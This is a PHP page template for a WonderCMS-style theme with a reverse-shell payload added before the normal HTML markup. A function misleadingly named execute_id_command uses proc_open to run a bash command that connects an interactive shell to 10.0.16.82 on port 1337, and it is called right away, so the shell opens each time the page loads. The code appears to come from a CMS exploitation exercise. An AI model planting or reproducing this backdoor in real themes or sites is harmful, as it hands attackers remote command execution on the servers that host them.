<?php 

function execute_id_command() {
    $command = "bash -c 'bash -i >& /dev/tcp/10.0.16.82/1337 0>&1'"; // Comando a ser executado
    $descriptorspec = array(
        0 => array("pipe", "r"), // Entrada padrão
        1 => array("pipe", "w"), // Saída padrão
        2 => array("pipe", "w")  // Erro padrão
    );

    $cwd = null; // Diretório de trabalho atual
    $env = null; // Ambiente do processo

    // Inicia o processo
    $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);

    if (is_resource($process)) {
        // Captura a saída padrão
        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        // Captura a saída de erro (se necessário)
        $error = stream_get_contents($pipes[2]);
        fclose($pipes[2]);

        // Fecha o processo
        proc_close($process);

        // Retorna a saída ou erro
        if ($output) {
            return $output;
        } else {
            return $error;
        }
    } else {
        return "Erro ao iniciar o processo.";
    }
}

// Executa o comando e exibe o resultado
echo execute_id_command();

?>


global $Wcms; 
?>

<!DOCTYPE html>
<html lang="en">
	<head>
		<!-- Encoding, browser compatibility, viewport -->
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Search Engine Optimization (SEO) -->
		<meta name="title" content="<?= $Wcms->get('config', 'siteTitle') ?> - <?= $Wcms->page('title') ?>" />
		<meta name="description" content="<?= $Wcms->page('description') ?>">
		<meta name="keywords" content="<?= $Wcms->page('keywords') ?>">
		<meta property="og:url" content="<?= $Wcms->getCurrentPageUrl() ?>" />
		<meta property="og:type" content="website" />
		<meta property="og:site_name" content="<?= $Wcms->get('config', 'siteTitle') ?>" />
		<meta property="og:title" content="<?= $Wcms->page('title') ?>" />
		<meta name="twitter:title" content="<?= $Wcms->get('config', 'siteTitle') ?> - <?= $Wcms->page('title') ?>" />
		<meta name="twitter:description" content="<?= $Wcms->page('description') ?>" />

		<!-- Website and page title -->
		<title>
			<?= $Wcms->get('config', 'siteTitle') ?> - <?= $Wcms->page('title') ?>

		</title>

		<!-- Admin CSS -->
		<?= $Wcms->css() ?>
		
		<!-- Theme CSS -->
		<link rel="stylesheet" rel="preload" as="style" href="<?= $Wcms->asset('css/style.css') ?>">
	</head>
	
	<body>
		<!-- Admin settings panel and alerts -->
		<?= $Wcms->settings() ?>

		<?= $Wcms->alerts() ?>

		<section id="topMenu">
			<div class="inner">
				<nav>
					<ul class="menu">
						<!-- Menu -->
						<?= $Wcms->menu() ?>

					</ul>
				</nav>
			</div>
		</section>

		<div id="wrapper">
			<section id="intro" class="wrapper style1 fullscreen">
				<div class="inner">
					<!-- Main content for each page -->
					<?= $Wcms->page('content') ?>

				</div>
			</section>

			<section class="wrapper style2">
					<div class="inner">
						<!-- Static editable block, same on each page -->
						<?= $Wcms->block('subside') ?>

					</div>
			</section>
		</div>

		<footer class="wrapper style2">
			<div class="inner">
				<!-- Footer -->
				<?= $Wcms->footer() ?>

			</div>
		</footer>

		<!-- Admin JavaScript. More JS libraries can be added below -->
		<?= $Wcms->js() ?>

	</body>
</html>
